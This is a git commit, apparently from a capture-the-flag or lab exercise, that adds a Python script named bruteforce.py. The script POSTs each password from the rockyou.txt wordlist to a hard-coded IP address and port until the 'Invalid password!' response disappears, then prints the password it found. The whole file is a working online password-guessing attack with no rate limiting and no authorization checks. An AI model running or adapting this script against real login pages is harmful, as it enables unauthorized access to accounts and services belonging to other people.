457ba9895331e76e77cf63826ab0ac46d8d073c4
b1tsec <74562513+b1tsec@users.noreply.github.com>
2020-11-23 20:24:29 +0100

    Initial commit

---
+++ bruteforce.py
@@ -0,0 +1,23 @@
+#!/usr/bin/python3
+
+import requests
+import sys
+
+url = "http://178.128.40.63:30602/"
+
+def bruteforce(passw):
+	postdata = {"password" : passw}
+	request = requests.post(url, data = postdata)
+	if "Invalid password!" not in request.text:
+		print("[+] The password is:", passw)
+		sys.exit()
+			
+def main():
+	with open("/opt/wordlists/rockyou.txt", "r") as pass_file:
+		for password in pass_file:
+			stripped_pass = password.strip()
+			bruteforce(stripped_pass) 
+		
+if __name__ == '__main__':
+	main()
+		
